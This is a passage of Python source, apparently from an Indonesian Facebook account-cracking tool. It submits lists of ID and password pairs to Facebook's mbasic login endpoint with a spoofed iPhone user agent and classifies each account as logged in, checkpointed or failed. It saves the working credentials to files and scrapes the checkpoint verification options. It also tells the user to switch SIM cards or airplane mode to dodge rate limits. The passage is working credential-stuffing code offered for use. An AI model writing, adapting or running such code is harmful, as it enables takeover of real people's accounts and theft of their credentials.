	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/404.0.0.30.110;FBBV/464513134;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBCR/;FBID/phone;FBLC/it;FBOP/0]'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login  Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> ASF   %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# INTERNET CONNECTION PROBLEMS, CHECK & TRY LAG'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
#def cek_apk(session,cookie):
	#w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	#sop = BeautifulSoup(w,"html.parser")
	#x = sop.find("form",method="post")
	#game = [i.text for i i#n x.find_all("#h3")]
	#if len(game)==0:
		#print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	#else:
		#for i in range(len(game)):
			#print(#"   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	#w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	#sop = BeautifulSoup(w,"html.parser")
	#x = sop.find("form",method="#post")
	#game = [i.text for i i#n x.find_all("h3")#]
	#if len(game)==0:
		#print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	#else:
		#for i in range(len(game)):
			#print("   %s%s. %s%s"%(K,i+#1,game[i].replace#("Kedaluwarsa"," Kedaluwarsa"),N))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()